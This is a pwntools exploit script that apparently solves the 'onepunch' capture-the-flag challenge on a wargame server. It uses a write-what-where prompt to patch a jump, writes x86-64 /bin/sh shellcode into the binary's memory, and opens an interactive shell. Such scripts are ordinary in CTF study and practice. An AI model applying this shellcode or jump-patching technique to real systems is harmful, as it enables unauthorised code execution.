from pwn import *

def main():
    # set jmp back to certain address
    data = [(0x400768, 180)]

    # write shell code from 0x400790
    shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
    for i in range(len(shellcode)):
        data.append((0x400790 + i, shellcode[i]))

    # set jmp to 0x400790
    data.append((0x400768, 39))
    
    #r = process("./asset/onepunch")
    r = remote('hackme.inndy.tw',7718)
    input("Press any button to continue...")
    for i in range(len(data)):
        r.recvuntil(b'Where What?')
        s = hex(data[i][0])[2:] + ' ' + str(data[i][1])
        s = s.encode('utf-8')
        print("s:", s)
        r.sendline(s)
    r.interactive()

if __name__ == '__main__':
    main()
